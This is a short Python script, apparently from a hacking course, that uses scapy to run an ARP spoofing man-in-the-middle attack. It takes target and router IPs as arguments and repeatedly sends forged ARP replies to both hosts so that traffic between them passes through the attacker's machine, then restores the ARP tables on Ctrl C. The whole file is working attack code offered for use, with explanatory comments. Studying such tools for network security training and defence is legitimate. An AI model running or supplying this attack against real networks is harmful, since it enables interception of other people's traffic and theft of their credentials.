#!/usr/bin/env python
import time
import scapy.all as scapy
# for using this program in the newest Python versions write: import argparse
import optparse


# getting arguments from command line in scrypt
def get_arguments():
    # for argparse
    # parser = argparse.ArgumentParser()
    # parser.add_argument(....)
    # options = parser.parse_args()

    # object for parsing options and arguments
    parser = optparse.OptionParser()
    # adding new options and arguments
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-r", "--router", dest="router", help="Router IP")

    # getting that options and arguments in variables
    (options, arguments) = parser.parse_args()

    if not options.target:
        print("[-] Please specify target IP, enter --help for more info")
    elif not options.router:
        print("[-] Please specify router IP, enter --help for more info")
    return options


def get_mac(ip):
    # creating ARP request for getting IP of needed object
    arp_request = scapy.ARP(pdst=ip)

    # variable that helps us to direct our packet in our local network for each device
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # new packet that is combination of all the methods
    arp_request_broadcast = broadcast / arp_request

    # getting the response of each device in network
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# spoofing the target ip

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # creating a packet that change ARP table of the target computer and set our MAC address as a MAC address of router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# restoring the MAC address of router in the target ARP table

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=4, verbose=False)


options = get_arguments()
target_ip_options = str(options.target)
router_ip_options = str(options.router)

sent_packets_count = 0
try:
    # loop that contains executing of ARP-spoof and writing amount of packet that has been sent
    while True:
        spoof(target_ip_options, router_ip_options)
        spoof(router_ip_options, target_ip_options)
        sent_packets_count += 2

        # dynamical writing new sent packets every 2 seconds
        print(f"\r[+] Sent {sent_packets_count} packets", end="", flush=True)
        time.sleep(2)
# if we enter Ctrl C we end the program and restore data
except KeyboardInterrupt:
    restore(target_ip_options, router_ip_options)
    print("[+] Detected Ctrl C..... Restoring ARP tables")
